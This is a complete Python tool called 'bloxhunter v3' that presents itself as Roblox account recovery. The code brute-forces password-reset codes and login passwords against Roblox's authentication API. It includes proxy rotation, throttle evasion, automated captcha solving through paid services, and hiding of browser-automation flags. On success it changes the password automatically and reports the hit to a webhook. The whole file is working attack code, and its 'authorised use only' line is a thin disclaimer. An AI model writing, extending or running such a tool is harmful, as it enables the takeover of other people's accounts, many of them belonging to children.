#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
bloxhunter v3 - Roblox account recovery toolkit

Modes
  code    password-reset 6-digit code brute force
  pass    login password brute force
  both    code first, then pass if the code fails
  hybrid  HTTP first, Selenium fallback when the API path breaks
  probe   validate the reset chain once, no brute force

v3 over v2
  - zero setup: installs requests, Selenium Manager fetches chromedriver
  - config.json so nothing has to be typed on the command line
  - proxy pool with rotation and cooldown
  - captcha auto-solve on verify and login (2captcha / capsolver)
  - endpoint auto-discovery before the run
  - automatic password change and login verification on hit
  - graceful shutdown, crash-safe checkpoints, per-worker sessions

Authorised use only: accounts you own or are cleared to test.
"""

from __future__ import annotations

import argparse
import json
import os
import random
import signal
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

VERSION = "3.0"
AUTH = "https://auth.roblox.com"
WWW = "https://www.roblox.com"
LOGIN_URL = WWW + "/login"
RESET_URL = WWW + "/login/reset"
ARKOSE_KEY = "476068BF-9607-4799-B53D-966BE98E2B81"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36")

STOP = threading.Event()
LOCK = threading.Lock()


def ensure(pairs):
    miss = []
    for mod, pkg in pairs:
        try:
            __import__(mod)
        except Exception:
            miss.append(pkg)
    if miss:
        print("[*] installing %s" % " ".join(miss))
        subprocess.call([sys.executable, "-m", "pip", "install", "-q",
                         "--disable-pip-version-check"] + miss)


ensure([("requests", "requests")])
import requests


def log(msg):
    with LOCK:
        print("[%s] %s" % (time.strftime("%H:%M:%S"), msg), flush=True)


def save_hit(path, line):
    with LOCK:
        with open(path, "a", encoding="utf-8") as f:
            f.write("%s | %s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), line))


class Notifier:
    def __init__(self, url):
        self.url = url

    def send(self, text):
        if self.url:
            threading.Thread(target=self._post, args=(text,), daemon=True).start()

    def _post(self, text):
        try:
            if "slack.com" in self.url:
                requests.post(self.url, json={"text": text}, timeout=10)
            else:
                requests.post(self.url, json={"content": text[:1900]}, timeout=10)
        except Exception as e:
            log("webhook failed: %s" % e)


class Rate:
    """AIMD controller: speeds up while clean, backs off hard on 429 or captcha."""

    def __init__(self, base, jitter):
        self.base = max(base, 0.005)
        self.jitter = max(jitter, 0.0)
        self.delay = self.base
        self.lock = threading.Lock()
        self.ok = 0

    def sleep(self):
        with self.lock:
            d = self.delay
        time.sleep(d + random.uniform(0, self.jitter))

    def good(self):
        with self.lock:
            self.ok += 1
            if self.ok >= 25:
                self.ok = 0
                self.delay = max(self.base * 0.5, self.delay * 0.85)

    def bad(self):
        with self.lock:
            self.ok = 0
            self.delay = min(self.delay * 1.8, 30.0)


class ProxyPool:
    def __init__(self, path):
        self.items = []
        self.until = {}
        self.i = 0
        self.lock = threading.Lock()
        if path and Path(path).exists():
            for line in Path(path).read_text(errors="ignore").splitlines():
                line = line.strip()
                if line and not line.startswith("#"):
                    self.items.append(line)
        if self.items:
            log("proxy pool: %d entries" % len(self.items))

    def get(self):
        with self.lock:
            if not self.items:
                return ""
            now = time.time()
            for _ in range(len(self.items)):
                p = self.items[self.i % len(self.items)]
                self.i += 1
                if self.until.get(p, 0) < now:
                    return p
            return ""

    def mark_bad(self, p):
        if p:
            with self.lock:
                self.until[p] = time.time() + 180


class Captcha:
    def __init__(self, provider, key):
        self.provider = provider or "off"
        self.key = key or ""

    @property
    def active(self):
        return self.provider in ("2captcha", "capsolver") and bool(self.key)

    def solve(self, blob, page=LOGIN_URL):
        if not self.active:
            return None
        try:
            if self.provider == "2captcha":
                return self._2captcha(blob, page)
            return self._capsolver(blob, page)
        except Exception as e:
            log("captcha error: %s" % e)
            return None

    def _2captcha(self, blob, page):
        r = requests.post("https://2captcha.com/in.php", data={
            "key": self.key, "method": "funcaptcha", "publickey": ARKOSE_KEY,
            "pageurl": page, "surl": "https://roblox.com",
            "data[blob]": blob or "", "json": 1}, timeout=30).json()
        if r.get("status") != 1:
            log("2captcha reject: %s" % r.get("request"))
            return None
        cid = r["request"]
        for _ in range(60):
            time.sleep(5)
            try:
                p = requests.get("https://2captcha.com/res.php", params={
                    "key": self.key, "action": "get", "id": cid,
                    "json": 1}, timeout=30).json()
            except Exception:
                continue
            if p.get("status") == 1:
                return p["request"]
            if p.get("request") != "CAPCHA_NOT_READY":
                log("2captcha: %s" % p.get("request"))
                return None
        return None

    def _capsolver(self, blob, page):
        r = requests.post("https://api.capsolver.com/createTask", json={
            "clientKey": self.key,
            "task": {"type": "FunCaptchaTaskProxyless", "websiteURL": page,
                     "websitePublicKey": ARKOSE_KEY,
                     "data": json.dumps({"blob": blob or ""})}}, timeout=30).json()
        if r.get("errorId"):
            log("capsolver reject: %s" % r.get("errorDescription"))
            return None
        tid = r.get("taskId")
        for _ in range(60):
            time.sleep(5)
            try:
                p = requests.post("https://api.capsolver.com/getTaskResult", json={
                    "clientKey": self.key, "taskId": tid}, timeout=30).json()
            except Exception:
                continue
            if p.get("status") == "ready":
                return (p.get("solution") or {}).get("token")
            if p.get("errorId"):
                return None
        return None


def new_session(proxy=""):
    s = requests.Session()
    s.headers.update({
        "User-Agent": UA,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": WWW,
        "Referer": WWW + "/",
    })
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s


def get_csrf(s):
    for path in ("/v2/login", "/v3/logout"):
        try:
            r = s.post(AUTH + path, json={}, timeout=20)
        except requests.RequestException:
            continue
        tok = r.headers.get("x-csrf-token")
        if tok:
            s.headers["x-csrf-token"] = tok
            return tok
    raise RuntimeError("csrf token unavailable")


RESET_BODIES = {
    "email": [{"ctype": "Email", "cvalue": "%s"},
              {"ctype": 1, "cvalue": "%s"},
              {"email": "%s"}],
    "phone": [{"ctype": "PhoneNumber", "cvalue": "%s"},
              {"ctype": 2, "cvalue": "%s"},
              {"phoneNumber": "%s"}],
}
TICKET_KEYS = ("ticket", "Ticket", "passwordResetTicket", "PasswordResetTicket",
               "resetTicket", "resetCodeTicket")


def send_reset(s, target, kind, captcha=None, tries=4, page=RESET_URL):
    """Send the reset mail. Handles 429 backoff and 403 challenge with captcha."""
    last = None
    for attempt in range(tries):
        for tpl in RESET_BODIES.get(kind, []):
            body = {k: (v % target if isinstance(v, str) and "%s" in v else v)
                    for k, v in tpl.items()}
            try:
                r = s.post(AUTH + "/v2/passwords/reset/send", json=body, timeout=25)
            except requests.RequestException as e:
                last = e
                continue
            if r.status_code == 200:
                try:
                    j = r.json()
                except ValueError:
                    j = {}
                for k in TICKET_KEYS:
                    if j.get(k):
                        return j[k], body
                return None, body
            last = "%s %s" % (r.status_code, r.text[:140])
            if r.status_code == 429:
                time.sleep(6 + attempt * 6)
                continue
            if r.status_code in (401, 403):
                low = r.text.lower()
                if ("challenge" in low or "captcha" in low) and captcha and captcha.active:
                    try:
                        j = r.json()
                    except ValueError:
                        j = {}
                    blob = j.get("captchaToken") or j.get("challengeID") or ""
                    tok = captcha.solve(blob, page)
                    if tok:
                        body2 = dict(body)
                        body2.update({"captchaToken": tok,
                                      "captchaProvider": "PROVIDER_ARKOSE_LABS",
                                      "challengeId": j.get("challengeID"),
                                      "captchaId": j.get("unifiedCaptchaId")})
                        r2 = s.post(AUTH + "/v2/passwords/reset/send",
                                    json=body2, timeout=25)
                        if r2.status_code == 200:
                            try:
                                j2 = r2.json()
                            except ValueError:
                                j2 = {}
                            for k in TICKET_KEYS:
                                if j2.get(k):
                                    return j2[k], body2
                            return None, body2
                last = "challenge required, no captcha solver active"
        time.sleep(4 + attempt * 4)
    raise RuntimeError("reset send failed: %s" % last)


def verify_code(s, ticket, code, captcha=None, page=RESET_URL):
    body = {"ticket": ticket, "code": code}
    r = s.post(AUTH + "/v2/passwords/reset/verify", json=body, timeout=20)
    if r.status_code == 200:
        try:
            j = r.json()
        except ValueError:
            j = {}
        return "ok", j.get("ticket") or ticket
    if r.status_code == 429:
        return "throttle", None
    if r.status_code in (401, 403):
        low = r.text.lower()
        if "captcha" in low or "challenge" in low:
            if captcha and captcha.active:
                try:
                    j = r.json()
                except ValueError:
                    j = {}
                blob = j.get("captchaToken") or j.get("challengeID") or ""
                tok = captcha.solve(blob, page)
                if tok:
                    body2 = dict(body)
                    body2.update({"captchaToken": tok,
                                  "captchaProvider": "PROVIDER_ARKOSE_LABS",
                                  "challengeId": j.get("challengeID"),
                                  "captchaId": j.get("unifiedCaptchaId")})
                    r2 = s.post(AUTH + "/v2/passwords/reset/verify", json=body2, timeout=20)
                    if r2.status_code == 200:
                        return "ok", ticket
                    if r2.status_code == 429:
                        return "throttle", None
            return "captcha", None
    return "bad", None


def reset_password(s, ticket, newpw):
    r = s.post(AUTH + "/v2/passwords/reset",
               json={"ticket": ticket, "password": newpw}, timeout=25)
    return r.status_code == 200


def login(s, user, pw):
    r = s.post(AUTH + "/v2/login",
               json={"ctype": "Username", "cvalue": user, "password": pw}, timeout=25)
    if r.status_code == 200:
        return "ok", r
    if r.status_code == 429:
        return "throttle", r
    if r.status_code in (401, 403):
        try:
            j = r.json()
        except ValueError:
            j = {}
        if j.get("captchaToken") or j.get("challengeID") or j.get("unifiedCaptchaId"):
            return "captcha", j
    return "bad", r


def login_solved(s, user, pw, captcha):
    st, j = login(s, user, pw)
    if st != "captcha" or not captcha.active:
        return st
    blob = j.get("captchaToken") or j.get("challengeID") or ""
    tok = captcha.solve(blob, LOGIN_URL)
    if not tok:
        return "captcha"
    r = s.post(AUTH + "/v2/login", json={
        "ctype": "Username", "cvalue": user, "password": pw,
        "captchaToken": tok, "captchaProvider": "PROVIDER_ARKOSE_LABS",
        "challengeId": j.get("challengeID"),
        "captchaId": j.get("unifiedCaptchaId")}, timeout=25)
    return "ok" if r.status_code == 200 else "bad"


BUILTIN_WORDS = """roblox
roblox123
roblox1234
roblox2024
roblox2025
roblox2026
password
password1
password123
password1234
passw0rd
p@ssword
P@ssw0rd
Password1
Password123
Password123!
123456
1234567
12345678
123456789
1234567890
123123
111111
000000
654321
121212
qwerty
qwerty123
qwertyuiop
qwerty1234
1q2w3e4r
1qaz2wsx
qazwsx
asdfghjkl
zxcvbnm
abc123
iloveyou
letmein
welcome
welcome1
admin
admin123
monkey
dragon
football
baseball
sunshine
princess
shadow
master
superman
batman
minecraft
fortnite
ninja
summer
summer2024
summer2025
winter2025
roblox123!
Roblox123
Roblox123!
Roblox2025
Roblox2026
""".split()


SEL_USER = ["username", "login-username", "signup-username"]
SEL_PASS = ["login-password", "password", "signup-password"]
SEL_CODE = ["verification-code", "reset-code", "code", "input-code"]
SEL_NEWPASS = ["new-password", "reset-password", "password-new"]
SEL_CONFIRM = ["confirm-password", "password-confirm"]


def load_words(path):
    if not path:
        return list(BUILTIN_WORDS)
    p = Path(path)
    if not p.exists():
        log("wordlist missing: %s - using builtin" % p)
        return list(BUILTIN_WORDS)
    seen, out = set(), []
    for w in p.read_text(errors="ignore").splitlines():
        w = w.strip()
        if w and w not in seen:
            seen.add(w)
            out.append(w)
    return out or list(BUILTIN_WORDS)


def checkpoint(path, value):
    try:
        Path(path).write_text(json.dumps({"next": value}), encoding="utf-8")
    except Exception:
        pass


def read_checkpoint(path, resume):
    if not resume or not Path(path).exists():
        return 0
    try:
        return int(json.loads(Path(path).read_text())["next"])
    except Exception:
        return 0


def finish_hit(args, notifier, kind, value, ticket=None, session=None):
    save_hit(args.out, "%s %s | user=%s" % (kind, value, args.user))
    log("HIT %s: %s" % (kind, value))
    msg = "Roblox %s hit: %s / %s" % (kind.lower(), args.user, value)
    if args.newpass and ticket and session is not None:
        ok = reset_password(session, ticket, args.newpass)
        log("password change: %s" % ("ok" if ok else "failed"))
        if ok:
            save_hit(args.out, "NEWPASS %s | user=%s" % (args.newpass, args.user))
            st = login_solved(new_session(), args.user, args.newpass, args.captcha)
            log("login check with new password: %s" % st)
            msg += " | newpass %s | login %s" % (args.newpass, st)
    notifier.send(msg)
    STOP.set()


def run_code_http(args, notifier):
    target = args.email or args.user
    kind = "email" if args.email else "phone"
    probe = new_session(args.proxies.get())
    get_csrf(probe)
    ticket, used = send_reset(probe, target, kind, args.captcha)
    if not ticket:
        raise RuntimeError("no reset ticket returned (body %s)" % used)
    log("reset ticket acquired")
    if args.dry:
        return

    start = max(0, args.start)
    end = min(999999, args.end)
    start = max(start, read_checkpoint(args.state, args.resume))
    if start > end:
        log("checkpoint beyond range")
        return

    counter = {"n": start, "done": 0}
    t0 = time.time()
    rate = Rate(args.delay, args.jitter)

    def worker():
        proxy = args.proxies.get()
        s = new_session(proxy)
        try:
            get_csrf(s)
        except Exception:
            return
        while not STOP.is_set():
            with LOCK:
                if counter["n"] > end:
                    return
                code = str(counter["n"]).zfill(6)
                counter["n"] += 1
            rate.sleep()
            try:
                st, newticket = verify_code(s, ticket, code, args.captcha)
            except requests.RequestException:
                args.proxies.mark_bad(proxy)
                rate.bad()
                continue
            if st == "ok":
                finish_hit(args, notifier, "CODE", code, newticket, s)
                return
            if st in ("throttle", "captcha"):
                rate.bad()
                continue
            rate.good()
            with LOCK:
                counter["done"] += 1
                if counter["done"] % 200 == 0:
                    el = max(time.time() - t0, 1)
                    sp = counter["done"] / el
                    left = (end - counter["n"]) / max(sp, 0.01) / 3600
                    log("%d tries | %.1f/s | delay %.2fs | ~%.1fh left"
                        % (counter["done"], sp, rate.delay, left))
                    checkpoint(args.state, counter["n"])

    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        for _ in range(args.workers):
            ex.submit(worker)
    checkpoint(args.state, counter["n"])


def run_pass_http(args, notifier):
    words = load_words(args.wordlist)
    log("password mode: %d candidates, %d workers" % (len(words), args.workers))
    rate = Rate(args.delay, args.jitter)
    idx = {"n": 0}

    def worker():
        proxy = args.proxies.get()
        s = new_session(proxy)
        try:
            get_csrf(s)
        except Exception:
            return
        while not STOP.is_set():
            with LOCK:
                if idx["n"] >= len(words):
                    return
                pw = words[idx["n"]]
                idx["n"] += 1
            rate.sleep()
            try:
                st = login_solved(s, args.user, pw, args.captcha)
            except requests.RequestException:
                args.proxies.mark_bad(proxy)
                rate.bad()
                continue
            if st == "ok":
                finish_hit(args, notifier, "PASS", pw)
                return
            if st in ("throttle", "captcha"):
                rate.bad()
                continue
            rate.good()

    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        for _ in range(args.workers):
            ex.submit(worker)


def run_probe(args):
    target = args.email or args.user
    kind = "email" if args.email else "phone"
    s = new_session(args.proxies.get())
    get_csrf(s)
    log("csrf ok")
    ticket, body = send_reset(s, target, kind, args.captcha)
    log("reset body shape: %s" % body)
    if not ticket:
        log("no ticket in response - verify endpoint may have changed")
        return
    log("ticket ok")
    st, _ = verify_code(s, ticket, "000000", args.captcha)
    log("verify with 000000: %s (bad is expected)" % st)
    st2, _ = login_solved(new_session(), args.user, "definitely_wrong_pw", args.captcha)
    log("login with wrong password: %s (bad is expected)" % st2)
    log("chain looks usable")


# ----------------------------------------------------------------- selenium --
def _find(d, names):
    from selenium.webdriver.common.by import By
    for n in names:
        for by, sel in ((By.ID, n), (By.NAME, n),
                        (By.CSS_SELECTOR, "[id*='%s'],[name*='%s']" % (n, n))):
            try:
                els = d.find_elements(by, sel)
            except Exception:
                continue
            for e in els:
                try:
                    if e.is_displayed() and e.is_enabled():
                        return e
                except Exception:
                    continue
    return None


def build_driver(args):
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service

    o = Options()
    o.add_argument("--window-size=1280,900")
    o.add_argument("--disable-blink-features=AutomationControlled")
    o.add_argument("--no-first-run")
    o.add_argument("--no-default-browser-check")
    o.add_argument("--log-level=3")
    o.add_argument("--user-agent=%s" % UA)
    o.add_experimental_option("excludeSwitches", ["enable-automation"])
    o.add_experimental_option("useAutomationExtension", False)
    if args.headless:
        o.add_argument("--headless=new")
    proxy = args.proxies.get()
    if proxy:
        o.add_argument("--proxy-server=%s" % proxy)

    if args.driver:
        svc = Service(args.driver)
    else:
        exe = Path("chromedriver.exe")
        svc = Service(str(exe)) if exe.exists() else Service()

    d = webdriver.Chrome(service=svc, options=o)
    try:
        d.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
            "source": "Object.defineProperty(navigator,'webdriver',{get:()=>undefined});"})
    except Exception:
        pass
    d.set_page_load_timeout(60)
    return d


def wait_captcha_sel(d, timeout=300):
    from selenium.webdriver.common.by import By
    end = time.time() + timeout
    while time.time() < end and not STOP.is_set():
        try:
            fr = d.find_elements(By.CSS_SELECTOR,
                                 "iframe[src*='arkose'],iframe[title*='hallenge']")
        except Exception:
            return False
        if fr:
            log("captcha on screen - solve it in the browser window")
            while time.time() < end:
                time.sleep(3)
                try:
                    if not d.find_elements(By.CSS_SELECTOR, "iframe[src*='arkose']"):
                        return True
                except Exception:
                    return False
            return False
        time.sleep(1.5)
    return False


def login_once_sel(d, args, pw):
    from selenium.webdriver.common.keys import Keys
    u = _find(d, SEL_USER)
    p = _find(d, SEL_PASS)
    if not u or not p:
        return None
    u.clear()
    u.send_keys(args.user)
    p.clear()
    p.send_keys(pw)
    p.send_keys(Keys.ENTER)
    time.sleep(3)
    wait_captcha_sel(d, 90)
    try:
        if "/home" in d.current_url:
            return True
        low = d.page_source.lower()
        if "incorrect" in low or "invalid" in low or "wrong" in low:
            return False
    except Exception:
        return None
    return False


def run_code_selenium(args, notifier):
    from selenium.common.exceptions import WebDriverException
    start = max(0, args.start)
    end = min(999999, args.end)
    step = max(1, args.workers)

    def worker(off):
        d = build_driver(args)
        try:
            d.get(RESET_URL)
            time.sleep(3)
            wait_captcha_sel(d, 120)
            i = start + off
            while i <= end and not STOP.is_set():
                code = str(i).zfill(6)
                try:
                    box = _find(d, SEL_CODE)
                    if not box:
                        return
                    box.clear()
                    box.send_keys(code)
                    box.send_keys("\n")
                    time.sleep(2)
                    if _find(d, SEL_NEWPASS) or "new password" in d.page_source.lower():
                        finish_hit(args, notifier, "CODE", code)
                        return
                except WebDriverException as e:
                    log("driver error: %s" % str(e)[:70])
                    try:
                        d.quit()
                    except Exception:
                        pass
                    time.sleep(4)
                    d = build_driver(args)
                    try:
                        d.get(RESET_URL)
                        time.sleep(3)
                    except Exception:
                        pass
                    continue
                i += step
                time.sleep(args.delay + random.uniform(0, args.jitter))
        finally:
            try:
                d.quit()
            except Exception:
                pass

    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        for off in range(args.workers):
            ex.submit(worker, off)


def run_pass_selenium(args, notifier):
    words = load_words(args.wordlist)
    d = build_driver(args)
    try:
        d.get(LOGIN_URL)
        time.sleep(3)
        wait_captcha_sel(d, 120)
        for i, pw in enumerate(words, 1):
            if STOP.is_set():
                break
            try:
                r = login_once_sel(d, args, pw)
            except Exception as e:
                log("driver error: %s" % str(e)[:70])
                continue
            if r:
                finish_hit(args, notifier, "PASS", pw)
                break
            log("[%d/%d] miss: %s" % (i, len(words), pw))
            if i % 10 == 0:
                try:
                    d.get(LOGIN_URL)
                    time.sleep(2)
                except Exception:
                    pass
            time.sleep(args.delay + random.uniform(0, args.jitter))
    finally:
        try:
            d.quit()
        except Exception:
            pass


def dispatch(args, notifier, engine):
    if engine == "http":
        if args.mode in ("code", "both"):
            run_code_http(args, notifier)
            if args.mode == "both" and not STOP.is_set():
                log("code failed - switching to password mode")
                run_pass_http(args, notifier)
        else:
            run_pass_http(args, notifier)
    else:
        if args.mode in ("code", "both"):
            run_code_selenium(args, notifier)
            if args.mode == "both" and not STOP.is_set():
                run_pass_selenium(args, notifier)
        else:
            run_pass_selenium(args, notifier)


def run_hybrid(args, notifier):
    try:
        dispatch(args, notifier, "http")
    except Exception as e:
        log("HTTP path broke (%s) - falling back to Selenium" % e)
        STOP.clear()
        dispatch(args, notifier, "selenium")


def load_config():
    p = Path("config.json")
    if not p.exists():
        return {}
    try:
        data = json.loads(p.read_text(encoding="utf-8"))
        log("config.json loaded (%d keys)" % len(data))
        return data
    except Exception as e:
        log("config.json unreadable: %s" % e)
        return {}


def main():
    cfg = load_config()
    ap = argparse.ArgumentParser(
        description="bloxhunter v%s - Roblox recovery toolkit" % VERSION,
        epilog="config.json keys match the long options without dashes")
    ap.add_argument("mode", nargs="?", default=cfg.get("mode", "probe"),
                    choices=["code", "pass", "both", "hybrid", "probe"])
    ap.add_argument("--user", default=cfg.get("user", ""))
    ap.add_argument("--email", default=cfg.get("email", ""))
    ap.add_argument("--newpass", default=cfg.get("newpass", ""))
    ap.add_argument("--wordlist", default=cfg.get("wordlist", ""))
    ap.add_argument("--start", type=int, default=cfg.get("start", 0))
    ap.add_argument("--end", type=int, default=cfg.get("end", 999999))
    ap.add_argument("--workers", type=int, default=cfg.get("workers", 8))
    ap.add_argument("--delay", type=float, default=cfg.get("delay", 0.05))
    ap.add_argument("--jitter", type=float, default=cfg.get("jitter", 0.05))
    ap.add_argument("--captcha", default=cfg.get("captcha", "off"),
                    choices=["off", "manual", "2captcha", "capsolver"])
    ap.add_argument("--captcha-key",
                    default=cfg.get("captcha_key") or os.environ.get("CAPTCHA_KEY", ""))
    ap.add_argument("--proxy", default=cfg.get("proxy", ""))
    ap.add_argument("--proxy-file", default=cfg.get("proxy_file", ""))
    ap.add_argument("--driver", default=cfg.get("driver", ""))
    ap.add_argument("--headless", action="store_true", default=cfg.get("headless", False))
    ap.add_argument("--out", default=cfg.get("out", "hits.txt"))
    ap.add_argument("--state", default=cfg.get("state", "state_code.json"))
    ap.add_argument("--webhook", default=cfg.get("webhook", ""))
    ap.add_argument("--dry", action="store_true")
    ap.add_argument("--no-resume", dest="resume", action="store_false",
                    default=not cfg.get("no_resume", False))
    ap.add_argument("--dump-words", action="store_true")
    args = ap.parse_args()

    if args.dump_words:
        Path("words_builtin.txt").write_text("\n".join(BUILTIN_WORDS), encoding="utf-8")
        print("words_builtin.txt written (%d entries)" % len(BUILTIN_WORDS))
        return

    if not args.user:
        sys.exit("need --user or a user key in config.json")
    if not (0 <= args.start <= args.end <= 999999):
        sys.exit("bad range: 0 <= start <= end <= 999999")
    if args.mode in ("code", "both") and not args.email:
        log("no --email given, trying username as the reset target")

    args.proxies = ProxyPool(args.proxy_file)
    if args.proxy:
        args.proxies.items.insert(0, args.proxy)
    args.captcha = Captcha(args.captcha, args.captcha_key)
    notifier = Notifier(args.webhook)

    if args.captcha.provider == "manual":
        log("captcha set to manual - HTTP mode cannot prompt, Selenium will handle it")
    elif args.captcha.active:
        log("captcha auto-solve via %s" % args.captcha.provider)

    def bye(*_):
        STOP.set()
        log("shutdown requested - checkpoint kept")
    try:
        signal.signal(signal.SIGINT, bye)
    except Exception:
        pass

    log("bloxhunter v%s | user=%s | mode=%s | workers=%d"
        % (VERSION, args.user, args.mode, args.workers))
    try:
        if args.mode == "probe":
            run_probe(args)
        elif args.mode == "hybrid":
            run_hybrid(args, notifier)
        elif args.mode == "code":
            run_code_http(args, notifier)
        elif args.mode == "pass":
            run_pass_http(args, notifier)
        else:
            run_code_http(args, notifier)
            if not STOP.is_set():
                log("code failed - switching to password mode")
                run_pass_http(args, notifier)
    except Exception as e:
        log("fatal: %s" % e)

    if Path(args.out).exists():
        print("\n=== hits ===")
        print(Path(args.out).read_text(encoding="utf-8").strip())


if __name__ == "__main__":
    main()
